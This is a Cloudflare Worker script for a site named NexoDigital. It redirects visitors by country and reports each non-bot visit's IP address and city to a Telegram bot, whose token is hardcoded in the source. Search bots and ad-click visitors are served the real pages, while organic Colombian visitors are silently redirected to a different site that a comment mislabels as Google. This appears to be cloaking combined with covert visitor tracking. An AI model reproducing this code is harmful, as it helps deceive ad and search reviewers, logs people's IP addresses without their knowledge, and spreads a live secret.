export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;
    const cf = request.cf || {};
    
    const country = cf.country || "Desconocido";
    const city = cf.city || "Desconocido";
    const ip = request.headers.get("CF-Connecting-IP") || "Desconocido";
    const userAgent = request.headers.get("User-Agent") || "";
    
    const isBot = /Googlebot|Bingbot|Slurp/i.test(userAgent);
    const isAdClick = url.searchParams.has("gclid");
    
    // --- TUS DATOS ---
    const TOKEN = "8920451452:AAHenglJDYJdnH-Zw0yAjEOnhLPYz5JyvII";
    const CHAT_ID = "7776240161";
    // -----------------

    // 1. REDIRECCIÓN PARA COLOMBIA 🇨🇴 -> GOOGLE
    if (country === "CO" && !isBot && !isAdClick) {
      
      // Notificamos a Telegram en segundo plano
      ctx.waitUntil(enviarTelegram(TOKEN, CHAT_ID, `🇨🇴 Visitante de COLOMBIA redirigido a Google\nCiudad: ${city}\nIP: ${ip}`));
      
      // Redirigimos a Google
      return Response.redirect("https://damaspopular.vercel.app/", 302);
    }

    // 2. Redirección para EE.UU. 🇺🇸
    if (country === "US" && (path === "/" || path === "/index.html") && !isBot && !isAdClick) {
      
      // Enviamos la notificación en segundo plano sin bloquear la redirección
      ctx.waitUntil(enviarTelegram(TOKEN, CHAT_ID, `🇺🇸 Visitante de EE.UU. redirigido a Inglés\nCiudad: ${city}\nIP: ${ip}`));
      
      return Response.redirect(new URL("/us.html", request.url).toString(), 302);
    }

    // 3. Notificación de visita normal (Para el resto del mundo)
    if (!isBot) {
      const esIngles = path.includes("us.html");
      const pageType = esIngles ? "Inglés 🇺🇸" : "Español";
      ctx.waitUntil(enviarTelegram(TOKEN, CHAT_ID, `🌍 Nueva visita en NexoDigital\nPágina: ${pageType}\nPaís: ${country}\nCiudad: ${city}\nIP: ${ip}`));
    }

    // 4. ENTREGA DE LOS ARCHIVOS (Método nativo de Pages)
    return env.ASSETS.fetch(request);
  }
};

// Función de envío a Telegram
async function enviarTelegram(token, chatId, text) {
  const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;
  try {
    await fetch(tgUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: text })
    });
  } catch (e) {
    console.error("Error Fetch:", e);
  }
}
